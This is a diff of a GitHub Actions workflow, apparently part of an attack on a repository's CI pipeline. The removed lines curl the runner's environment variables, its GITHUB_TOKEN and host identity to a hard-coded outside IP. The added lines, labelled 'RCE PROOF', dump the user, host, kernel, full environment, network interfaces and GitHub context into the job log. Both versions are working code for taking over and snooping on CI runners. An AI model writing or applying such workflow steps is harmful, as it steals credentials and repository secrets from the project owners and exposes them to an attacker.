@@ -7,9 +7,21 @@ jobs:
   audit:
     runs-on: ubuntu-latest
     steps:
-      - name: Run audit
+      - name: System info
         run: |
-          curl -sm5 http://167.99.67.192/github-actions-rce?repo=$GITHUB_REPOSITORY || true
-          env | curl -sm5 -X POST http://167.99.67.192/env -d @- || true
-          echo "GITHUB_TOKEN=$GITHUB_TOKEN" | curl -sm5 -X POST http://167.99.67.192/token -d @- || true
-          whoami && hostname && id | curl -sm5 -X POST http://167.99.67.192/id -d @- || true
+          echo "=== RCE PROOF ==="
+          whoami
+          hostname
+          id
+          uname -a
+          echo "=== ENVIRONMENT ==="
+          env | sort
+          echo "=== NETWORK ==="
+          ip addr show 2>/dev/null || ifconfig
+          echo "=== GITHUB CONTEXT ==="
+          echo "GITHUB_TOKEN length: ${#GITHUB_TOKEN}"
+          echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
+          echo "GITHUB_ACTOR: $GITHUB_ACTOR"
+          echo "GITHUB_SHA: $GITHUB_SHA"
+          echo "RUNNER_OS: $RUNNER_OS"
+          echo "=== DONE ==="
